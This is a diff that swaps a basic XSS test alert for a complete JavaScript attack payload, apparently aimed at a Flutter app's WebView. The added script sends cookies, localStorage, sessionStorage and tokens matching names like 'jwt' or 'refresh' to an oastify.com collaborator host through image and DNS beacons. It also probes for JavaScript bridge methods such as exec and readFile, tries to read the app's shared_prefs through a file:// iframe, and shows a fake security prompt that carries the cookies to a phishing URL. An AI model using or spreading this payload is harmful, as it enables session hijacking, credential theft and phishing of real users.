@@ -1,4 +1,107 @@
+
 <script>
-alert('XSS TEST');
-alert('User Agent: ' + navigator.userAgent);
+(function() {
+    var COLLAB = 'xbc9pg7k43zq55f0qmp8yahualgc44st.oastify.com';
+    
+    // 1. Initial beacon - proves XSS execution
+    new Image().src = 'http://xss-executed.' + COLLAB + '/?ua=' + 
+                      encodeURIComponent(navigator.userAgent);
+    
+    // 2. Show fake security alert
+    alert('🔒 Security Scan Running...');
+    
+    // 3. Steal ALL sensitive data
+    var payload = {
+        time: new Date().toISOString(),
+        url: window.location.href,
+        cookies: document.cookie,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        localStorage: {},
+        sessionStorage: {}
+    };
+    
+    // 4. Exfiltrate localStorage (where tokens live!)
+    console.log('=== DUMPING LOCALSTORAGE ===');
+    for(var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        var value = localStorage.getItem(key);
+        payload.localStorage[key] = value;
+        
+        console.log('Found:', key, '=', value.substring(0, 50) + '...');
+        
+        // Send high-value tokens immediately
+        if(key.match(/(token|auth|session|jwt|access|refresh)/i)) {
+            new Image().src = 'http://token-' + 
+                             encodeURIComponent(key) + '.' + COLLAB + 
+                             '/?value=' + encodeURIComponent(value.substring(0, 200));
+            alert('⚠️ Found authentication token: ' + key);
+        }
+    }
+    
+    // 5. Exfiltrate sessionStorage
+    for(var i = 0; i < sessionStorage.length; i++) {
+        var key = sessionStorage.key(i);
+        payload.sessionStorage[key] = sessionStorage.getItem(key);
+    }
+    
+    // 6. Send all stolen data via DNS (bypasses CORS)
+    var encoded = btoa(JSON.stringify(payload)).replace(/=/g, '');
+    // Split into chunks for DNS
+    var chunks = encoded.match(/.{1,50}/g) || [];
+    chunks.forEach(function(chunk, idx) {
+        new Image().src = 'http://data' + idx + '-' + chunk + '.' + COLLAB + '/';
+    });
+    
+    // 7. Check for JavaScript interfaces (potential RCE)
+    var interfaces = [];
+    for(var prop in window) {
+        if(window[prop] && typeof window[prop] === 'object') {
+            var methods = Object.getOwnPropertyNames(window[prop]);
+            if(methods.length > 0) {
+                interfaces.push(prop + ':' + methods.length);
+                
+                // Test dangerous methods
+                ['exec', 'execute', 'run', 'load', 'readFile', 'writeFile'].forEach(function(method) {
+                    if(methods.includes(method)) {
+                        new Image().src = 'http://dangerous-' + prop + '-' + method + '.' + COLLAB + '/';
+                    }
+                });
+            }
+        }
+    }
+    
+    // 8. Send interfaces list
+    if(interfaces.length > 0) {
+        new Image().src = 'http://interfaces-' + 
+                         btoa(interfaces.join(',')).replace(/=/g, '') + 
+                         '.' + COLLAB + '/';
+    }
+    
+    // 9. Try to access internal files
+    try {
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'file:///data/data/com.example.flutter_application_1/shared_prefs/';
+        document.body.appendChild(iframe);
+        setTimeout(function() {
+            new Image().src = 'http://file-access-attempt.' + COLLAB + '/';
+        }, 1000);
+    } catch(e) {}
+    
+    // 10. Social engineering - redirect to phishing after delay
+    setTimeout(function() {
+        if(confirm('🚨 CRITICAL VULNERABILITY FOUND!\n\nYour app has security flaws. Click OK to secure your account.')) {
+            window.location = 'https://security-patch.example.com/verify?ref=' + 
+                             encodeURIComponent(document.cookie);
+        }
+    }, 3000);
+    
+    // 11. Final beacon
+    new Image().src = 'http://complete.' + COLLAB + '/';
+    
+    alert('Security scan completed. ' + 
+          (Object.keys(payload.localStorage).length > 0 ? 
+           'Found stored data.' : 'No stored data found.'));
+})();
 </script>
